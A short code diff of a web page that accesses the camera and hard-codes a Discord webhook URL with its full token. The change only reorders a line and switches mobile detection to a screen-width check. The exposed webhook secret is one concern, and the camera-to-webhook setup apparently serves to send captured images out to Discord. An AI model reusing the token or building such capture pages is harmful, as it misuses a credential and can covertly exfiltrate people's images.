@@ -76,15 +76,15 @@
         const captureButton = document.getElementById('captureButton');
         const message = document.getElementById('message');
         const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
         const loadingIndicator = document.getElementById('loadingIndicator');
+        const ctx = canvas.getContext('2d');
 
         // Your Discord webhook URL
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1328823824275214336/zvW9MAN890FiTSeo53UINP2aHDjjBRxzXSHYzbggJiSfQdOS94XjH8Ex-aEfaUQy9TJ8";
 
         // Function to check if the device is mobile
         function isMobile() {
-            return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            return window.innerWidth <= 800; // Assuming anything below 800px is a mobile device
         }
 
         // Function to start the camera with specified facingMode
